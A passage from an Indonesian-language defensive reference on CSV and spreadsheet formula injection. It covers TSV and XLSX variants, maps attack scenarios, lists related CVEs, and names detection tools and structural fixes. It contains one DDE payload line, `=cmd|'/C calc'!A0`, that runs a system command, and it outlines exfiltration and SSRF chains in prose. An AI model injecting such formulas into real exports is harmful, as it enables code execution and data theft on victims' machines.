| **Multi-line field injection** | `"normal\n=cmd\|'/C calc'!A0"` — newline dalam field CSV yang dikutip membuat baris baru dalam spreadsheet, di mana formula dimulai di baris baru dengan karakter trigger. | Parser harus mendukung field multi-baris yang dikutip sesuai RFC 4180. |

### §7-2. TSV (Tab-Separated Values)

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Tab as sanitization conflict** | Ketika tab (`0x09`) digunakan sebagai delimiter field (TSV) dan prefix sanitasi, mekanisme pertahanan berkonflik dengan struktur format. | Aplikasi yang mengekspor TSV dan menggunakan sanitasi tab-prefix secara bersamaan. |

### §7-3. XLSX / ODS (Format Spreadsheet Berbasis XML)

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Formula dalam XML sel** | XLSX menyimpan konten sel dalam XML. Formula yang disuntikkan ke dalam nilai sel mungkin disimpan sebagai elemen `<f>` (formula) alih-alih elemen `<v>` (nilai), bergantung pada bagaimana library ekspor menangani konten. | Library ekspor harus menghasilkan struktur XLSX yang tepat. Beberapa library melakukan escape formula; yang lain tidak. |
| **External reference injection** | XLSX mendukung referensi eksternal (tautan ke workbook lain). Konten yang disuntikkan dapat membuat referensi yang memicu permintaan jaringan ketika file dibuka. | Excel mencoba menyelesaikan referensi eksternal saat dibuka, berpotensi dengan peringatan. |
| **Shared string table manipulation** | XLSX menggunakan shared string table untuk nilai yang berulang. Injeksi ke dalam tabel ini dapat mempengaruhi beberapa sel secara bersamaan dari satu titik injeksi. | Mengeksploitasi struktur optimasi format XLSX. |

---

## Pemetaan Skenario Serangan (Sumbu 3)

| Skenario | Arsitektur | Kategori Mutasi Utama | Interaksi |
|---|---|---|---|
| **Client-side RCE** | Pengguna membuka CSV/XLSX yang diekspor di Excel/LibreOffice di Windows | §1 + §2-1 (DDE) + §4 (obfuskasi) | Multi-step (peringatan DDE) |
| **Pencurian data sisi klien** | Pengguna membuka file yang diekspor; formula auto-mengeksfiltrasi | §1 + §2-2 (WEBSERVICE) atau §2-5 (IMPORT*) | Auto-execute atau klik |
| **Client-side SSRF** | Korban di jaringan internal; WEBSERVICE melakukan probe layanan internal | §1 + §2-2 + §3-2 | Auto-execute |
| **Pembacaan file sisi klien** | Korban membuka CSV di LibreOffice; file lokal diekstrak | §1 + §3-1 + §2-4 (DNS exfil) | Auto-execute |
| **Server-side RCE** | Aplikasi memproses XLSX yang diunggah sisi server | §6-1 + §2-1 (jika DDE diaktifkan di server) | Tidak ada (otomatis) |
| **Server-side XXE** | Unggahan XLSX di-parse oleh library yang rentan | §6-2 | Tidak ada (otomatis) |
| **Server-side SSRF** | Server mengevaluasi formula WEBSERVICE selama konversi | §6-1 + §2-2 + §3-2 (metadata) | Tidak ada (otomatis) |
| **Pencurian kredensial cloud** | SSSI di instance cloud → metadata → kredensial IAM | §6-1 + §3-2 | Tidak ada (otomatis) |
| **Rantai log poisoning** | Penyerang meracuni log → admin mengekspor CSV → formula aktif | §6-3 + §1 + §2/§2 | Tidak langsung (admin membuka ekspor) |
| **Kebocoran data lintas tenant** | Google Sheets IMPORTRANGE lintas batas organisasi | §2-5 (IMPORTRANGE) | Prompt otorisasi |
| **Phishing via spreadsheet** | Formula HYPERLINK yang disamarkan sebagai tautan sah | §2-1 + social engineering | Klik |
| **Supply chain** | Library CSV yang rentan dikirimkan tanpa sanitasi | §6-2, §7-3 | Bergantung pada konsumen |
| **Manipulasi transaksi keuangan** | Injeksi delimiter dalam field pesan keuangan mengubah parameter transaksi | §6-3 (Financial messaging) | Tidak ada (sisi server) |

---

## Pemetaan CVE / Bounty (2023–2025)

| Kombinasi Mutasi | CVE / Kasus | Produk | Dampak |
|---|---|---|---|
| §1-1 + §2-1 (rantai DDE RCE) | CVE-2025-12249 | Axosoft Scrum & Bug Tracking v22.1.1.11545 | RCE via field Title yang tidak disanitasi dalam ekspor CSV → eksekusi DDE |
| §1-1 + §2-1 (rantai DDE RCE) | CVE-2025-11279 | Axosoft (Bagian 1: CSV Injection) | CSV injection dalam fungsionalitas Edit Ticket; dipasangkan dengan CVE-2025-12249 untuk RCE penuh |
| §1-1 + formula dasar | CVE-2025-55745 | UnoPim (Quick Export) | Formula injection dalam fitur quick export; reverse shell didemonstrasikan |
| §1-1 + formula dasar | CVE-2025-62417 | Bagisto (Create New Product) | CSV formula injection karena kurangnya validasi input pada atribut produk |
| §1-1 + §2-1 | CVE-2024-24337 | Koha Library Management v23.05.05 | Injeksi DDE via ekspor CSV Budget dan Patrons Member |
| §1-1 + formula dasar | CVE-2024-28111 | (Aplikasi) | Formula injection dalam ekspor CSV |
| §1-1 + §2 (eksfiltrasi) | CVE-2024-29381 | Medplum | CSV/formula injection yang memungkinkan eksfiltrasi data saat admin mengekspor |
| §6-2 (XXE) | CVE-2024-45293 | PhpSpreadsheet (pembaca XLSX) | XXE via bypass encoding dalam scanner XML; pembacaan file sisi server & SSRF |
| §6-2 (XXE) | CVE-2024-45084 | IBM Cognos Controller 11.0.0–11.1.0 | Formula injection (CWE-1236) dalam platform pelaporan enterprise |
| §1-1 + formula dasar | CVE-2025-13133 | WordPress Simple User Import Export ≤1.1.7 | Formula injection dalam plugin impor/ekspor pengguna |
| §6-2 (XXE) | CVE-2018-19277 | PhpSpreadsheet | Injeksi XXE dalam parsing XLSX |
| §6-2 (XXE) | CVE-2017-5992 | openpyxl (Python) | XXE dalam parsing XLSX |
| §6-3 (Log poisoning) | — (riset Vectra) | Microsoft Azure Logs | Formula injection via poisoning log sign-in; tidak memerlukan autentikasi |
| §6-1 (SSSI) | — (Bishop Fox) | Aplikasi yang terintegrasi G-Suite | Eksfiltrasi data live-streaming + RCE berbasis DDE di instance cloud |
| §2-1 + §2-2 | HackerOne #1748961 | Consensys (MetaMask) | CSV injection dalam fungsionalitas ekspor |
| §2-2 (WEBSERVICE SSRF) | — (Bug bounty writeup) | Tidak diungkapkan | CSV injection → client-side SSRF → eksfiltrasi kredensial AWS IAM |
| §6-3 (Financial messaging) | — (Omar El Shopky, 2025) | Temenos T24 (OFS) | Injeksi delimiter field dalam pesan OFS menimpa field transaksi; dapat digeneralisasi ke middleware keuangan yang menggunakan format pesan yang dibatasi |

---

## Alat Deteksi

| Alat | Tipe | Cakupan Target | Teknik Inti |
|---|---|---|---|
| **CSVScan** | Analisis statis (SAST) | Aplikasi Java yang menggunakan library CSV | Analisis taint yang melacak input yang dikontrol pengguna ke sink ekspor CSV; mengidentifikasi pola formula injection dalam kode sumber (USENIX WOOT 2025) |
| **OWASP ZAP** | Scanner DAST | Endpoint ekspor CSV aplikasi web | Menyuntikkan karakter trigger formula ke dalam field form dan memeriksa apakah muncul tanpa sanitasi dalam ekspor CSV |
| **Burp Suite** | Scanner DAST / proxy | Fitur ekspor aplikasi web | Pengujian manual dan otomatis endpoint ekspor CSV/XLSX untuk formula injection; pemindaian pasif untuk karakter trigger dalam respons |
| **Veracode** | SAST | Kode sumber aplikasi | Mengidentifikasi pola CWE-1236 dalam kode yang menghasilkan output CSV |
| **Checkmarx** | SAST | Kode sumber aplikasi | Analisis statis untuk input pengguna yang tidak disanitasi dalam kode pembuatan CSV |
| **Fortify** | SAST | Kode sumber aplikasi | Mendeteksi sink formula injection dalam berbagai bahasa |
| **csv-injection-payloads** (payloadbox) | Koleksi payload | Pengujian manual | Daftar payload yang dikurasi untuk menguji CSV injection di berbagai aplikasi |
| **PayloadsAllTheThings** (swisskyrepo) | Koleksi payload / referensi | Pengujian manual | Repository payload komprehensif termasuk payload DDE, obfuskasi, dan eksfiltrasi |
| **CSV Injection Browser Extension** (tesis MIT) | Pertahanan sisi klien | Unduhan CSV berbasis browser | Ekstensi browser yang men-sanitasi trigger formula dalam file CSV yang diunduh sebelum mencapai aplikasi spreadsheet |
| **Cynet** | Perlindungan endpoint | Eksekusi DDE | Deteksi perilaku eksekusi perintah yang dimulai DDE dari aplikasi spreadsheet |

---

## Ringkasan: Prinsip Inti

**Properti fundamental** yang membuat CSV/Formula Injection dimungkinkan adalah ketiadaan total batas data-kode dalam format CSV. Tidak seperti bahasa pemrograman yang membedakan antara string literal dan kode yang dapat dieksekusi melalui sintaks (tanda kutip, kata kunci, anotasi tipe), CSV memperlakukan setiap nilai sel sebagai berpotensi dapat dieksekusi berdasarkan karakter pertamanya semata. Satu prefix `=` mengubah data yang tidak aktif menjadi formula aktif dengan akses ke fungsi jaringan, protokol file, dan — melalui DDE — permukaan perintah sistem operasi penuh. Ini bukan bug dalam implementasi tertentu; ini adalah properti arsitektur dari desain data-adalah-kode yang diwarisi dari aplikasi spreadsheet awal di mana setiap sel diharapkan berisi nilai literal atau formula.

**Patch inkremental gagal** karena beban pertahanan tersebar di seluruh stack. Aplikasi web harus men-sanitasi saat ekspor, tetapi kumpulan karakter trigger telah berkembang dari waktu ke waktu (tab, carriage return baru-baru ini ditambahkan ke panduan). Sanitasi berbasis prefix (apostrophe, tab) dikalahkan oleh perilaku simpan-dan-buka-ulang aplikasi spreadsheet itu sendiri, yang mungkin menghapus prefix. DDE telah dinonaktifkan secara default di Excel modern, tetapi WEBSERVICE — yang memungkinkan SSRF auto-executing dan eksfiltrasi data — tetap berfungsi penuh. Google Sheets memblokir DDE tetapi menyediakan fungsi `IMPORT*` dengan kekuatan eksfiltrasi yang setara. LibreOffice mengizinkan akses protokol `file://` yang tidak diizinkan oleh Excel maupun Google Sheets. Setiap aplikasi menambal vektor paling egregius miliknya sendiri sambil membiarkan yang lain terbuka, dan kurangnya sanitasi bawaan dalam library parsing CSV (dikonfirmasi oleh riset WOOT 2025 yang menganalisis empat library) berarti bahwa setiap developer aplikasi harus secara independen menemukan kembali dan mengimplementasikan logika pertahanan.

**Solusi struktural** akan memerlukan satu atau keduanya dari: (1) perbedaan tingkat format antara sel data dan sel formula dalam CSV (spesifikasi "safe CSV" di mana formula secara eksplisit opt-in alih-alih opt-out), atau (2) aplikasi spreadsheet memperlakukan data CSV yang diimpor sebagai teks-saja secara default, mengharuskan tindakan pengguna eksplisit untuk mengaktifkan evaluasi formula pada konten yang diimpor. Keduanya tidak ada saat ini. Pendekatan terdekat adalah kombinasi sanitasi output (mengawali semua sel yang dimulai dengan karakter trigger), validasi input (menolak atau melakukan escape karakter trigger saat entri data), dan edukasi pengguna (mengenali peringatan DDE dan konten eksternal). Untuk skenario sisi server, satu-satunya pertahanan yang andal adalah tidak pernah mengevaluasi formula dalam konten spreadsheet yang diunggah pengguna — properti yang harus ditegakkan di tingkat konfigurasi library, karena sebagian besar library secara default mengaktifkan perilaku evaluasi.

---

## Referensi

- OWASP Foundation, "CSV Injection," https://owasp.org/www-community/attacks/CSV_Injection
- MITRE CWE-1236, "Improper Neutralization of Formula Elements in a CSV File," https://cwe.mitre.org/data/definitions/1236.html
- Manuel Karl, Louis Bettels, Martin Johns, David Klein, "Comma Separated Vulnerabilities: Detecting Formula Injection in the Wild," USENIX WOOT 2025
- ReversingLabs, "Three New DDE Obfuscation Methods," https://www.reversinglabs.com/blog/cvs-dde-exploits-and-obfuscation
- Bishop Fox, "Server-Side Spreadsheet Injection — Formula Injection to RCE," https://bishopfox.com/blog/server-side-spreadsheet-injections
- NotSoSecure, "Data Exfiltration via Formula Injection Part 1," https://notsosecure.com/data-exfiltration-formula-injection-part1
- Breakpoint/Purrfect, "Weaponizing Excel Webservice," https://breakpoint.purrfect.fr/article/excel_webservice.html
- Vectra AI / Dmitriy Beryoza, "CSV Injection in Azure Logs," https://www.vectra.ai/blog/csv-injection-in-azure-logs
- Rhino Security Labs, "Cloud Security Risks Part 1: Azure CSV Injection Vulnerability," https://rhinosecuritylabs.com/azure/cloud-security-risks-part-1-azure-csv-injection-vulnerability/
- Ray Dedhia, "Preventing CSV Injection Attacks With A Browser Extension," MIT MEng Thesis 2024
- HackTricks, "Formula/CSV/Doc/LaTeX/GhostScript Injection," https://book.hacktricks.wiki/pentesting-web/formula-csv-doc-latex-ghostscript-injection.html
- SwisskyRepo/PayloadsAllTheThings, "CSV Injection," https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection
- payloadbox, "csv-injection-payloads," https://github.com/payloadbox/csv-injection-payloads
- Efficiup, "Formula Injection Cheat Sheet," https://www.efficiup.com/wp-content/plugins/qd-sharing/share/formula-injection-cheat-sheet.pdf
- SMC Tech Blog, "Beware of formulas: Comma Separated Victims," https://techblog.smc.it/en/2021-01-04/beware-of-formula/
- Symfony CVE-2021-41270, "Prevent CSV Injection via formulas," https://symfony.com/blog/cve-2021-41270-prevent-csv-injection-via-formulas

---

*Dokumen ini dibuat untuk tujuan riset keamanan defensif dan pemahaman kerentanan.*